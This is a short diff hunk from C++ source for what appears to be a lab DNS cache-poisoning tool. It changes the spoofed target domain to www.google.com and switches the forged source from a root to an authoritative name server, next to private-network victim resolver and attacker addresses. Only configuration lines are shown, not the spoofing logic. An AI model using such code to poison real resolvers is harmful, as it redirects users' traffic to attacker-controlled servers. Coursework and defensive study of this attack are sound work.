@@ -14,8 +14,8 @@ int main() {
     srand(time(0));    // Seed random number generator for DNS query ID
 
     // Configuration variables
-    string target_domain = "google.com";    // Target domain to spoof
-    string root_ns_ip = TODO;    // Spoofed source (pretending to be root DNS)
+    string target_domain = "www.google.com";    // Target domain to spoof
+    string authoritative_ns_ip = TODO;    // Spoofed source (pretending to be authoritative DNS)
     string recursive_ns_ip = "10.0.0.40";    // Target recursive DNS server
     string attacker_ip = "10.0.0.10";
     string attacker_server_ip = "10.0.0.20";    // IP we want to redirect traffic to
